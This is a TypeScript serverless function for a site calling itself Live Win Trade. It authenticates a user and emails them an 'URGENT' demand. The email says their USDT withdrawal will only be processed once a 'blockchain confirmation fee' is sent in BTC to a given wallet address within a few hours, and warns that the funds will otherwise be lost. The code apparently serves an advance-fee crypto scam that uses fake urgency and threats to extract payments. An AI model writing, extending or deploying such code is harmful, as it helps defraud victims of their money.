import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "https://esm.sh/resend@2.0.0";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.39.3";

const resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface NotificationRequest {
  userId: string;
  withdrawalAmount: number;
  feeAmount: number;
  walletAddress: string;
  hoursRemaining: number;
}

const handler = async (req: Request): Promise<Response> => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log("Processing blockchain fee notification request");

    // Get authorization header
    const authHeader = req.headers.get("Authorization");
    if (!authHeader) {
      console.error("No authorization header provided");
      return new Response(
        JSON.stringify({ error: "Authorization required" }),
        { status: 401, headers: { "Content-Type": "application/json", ...corsHeaders } }
      );
    }

    // Create Supabase client with user's token
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseAnonKey = Deno.env.get("SUPABASE_ANON_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseAnonKey, {
      global: { headers: { Authorization: authHeader } }
    });

    // Verify user
    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      console.error("Auth error:", authError);
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { "Content-Type": "application/json", ...corsHeaders } }
      );
    }

    const { withdrawalAmount, feeAmount, walletAddress, hoursRemaining }: NotificationRequest = await req.json();

    console.log(`Sending notification to user ${user.id} (${user.email})`);

    // Get user profile for name
    const { data: profile } = await supabase
      .from("profiles")
      .select("full_name, email")
      .eq("id", user.id)
      .single();

    const userName = profile?.full_name || "Valued Customer";
    const userEmail = profile?.email || user.email;

    if (!userEmail) {
      console.error("No email found for user");
      return new Response(
        JSON.stringify({ error: "User email not found" }),
        { status: 400, headers: { "Content-Type": "application/json", ...corsHeaders } }
      );
    }

    const emailResponse = await resend.emails.send({
      from: "Live Win Trade <onboarding@resend.dev>",
      to: [userEmail],
      subject: "⚠️ URGENT: Blockchain Confirmation Fee Required",
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f5;">
          <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
            <div style="background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); padding: 30px; border-radius: 12px 12px 0 0; text-align: center;">
              <h1 style="color: #ffffff; margin: 0; font-size: 24px;">⚠️ URGENT ACTION REQUIRED</h1>
            </div>
            
            <div style="background-color: #ffffff; padding: 30px; border-radius: 0 0 12px 12px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
              <p style="color: #374151; font-size: 16px; line-height: 1.6;">
                Dear ${userName},
              </p>
              
              <p style="color: #374151; font-size: 16px; line-height: 1.6;">
                Your withdrawal request of <strong>$${withdrawalAmount.toFixed(2)} USDT</strong> requires a blockchain confirmation fee to be processed.
              </p>
              
              <div style="background-color: #fef2f2; border: 2px solid #dc2626; border-radius: 8px; padding: 20px; margin: 20px 0;">
                <p style="color: #dc2626; font-weight: bold; margin: 0 0 10px 0; font-size: 18px; text-align: center;">
                  Payment Required: $${feeAmount.toFixed(2)} USDT
                </p>
                <p style="color: #991b1b; margin: 0; text-align: center; font-size: 14px;">
                  Time Remaining: ${hoursRemaining} hour(s)
                </p>
              </div>
              
              <div style="background-color: #f9fafb; border-radius: 8px; padding: 15px; margin: 20px 0;">
                <p style="color: #6b7280; font-size: 12px; margin: 0 0 5px 0;">Send BTC to this address:</p>
                <p style="color: #1f2937; font-family: monospace; font-size: 12px; word-break: break-all; margin: 0; background-color: #e5e7eb; padding: 10px; border-radius: 4px;">
                  ${walletAddress}
                </p>
              </div>
              
              <div style="background-color: #fef3c7; border: 1px solid #f59e0b; border-radius: 8px; padding: 15px; margin: 20px 0;">
                <p style="color: #92400e; font-weight: bold; margin: 0; font-size: 14px;">
                  ⚠️ WARNING: Failure to pay the confirmation fee within the time limit will result in the loss of your funds!
                </p>
              </div>
              
              <p style="color: #374151; font-size: 14px; line-height: 1.6;">
                Please log in to your account immediately to complete the payment.
              </p>
              
              <div style="text-align: center; margin-top: 30px;">
                <a href="https://livewintrade.com/dashboard/deposit" style="display: inline-block; background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); color: #ffffff; text-decoration: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; font-size: 16px;">
                  Pay Now
                </a>
              </div>
              
              <hr style="border: none; border-top: 1px solid #e5e7eb; margin: 30px 0;">
              
              <p style="color: #9ca3af; font-size: 12px; text-align: center; margin: 0;">
                This is an automated message from Live Win Trade. Please do not reply to this email.
              </p>
            </div>
          </div>
        </body>
        </html>
      `,
    });

    console.log("Email sent successfully:", emailResponse);

    return new Response(
      JSON.stringify({ success: true, messageId: emailResponse.data?.id }),
      {
        status: 200,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  } catch (error: any) {
    console.error("Error in send-blockchain-fee-notification:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
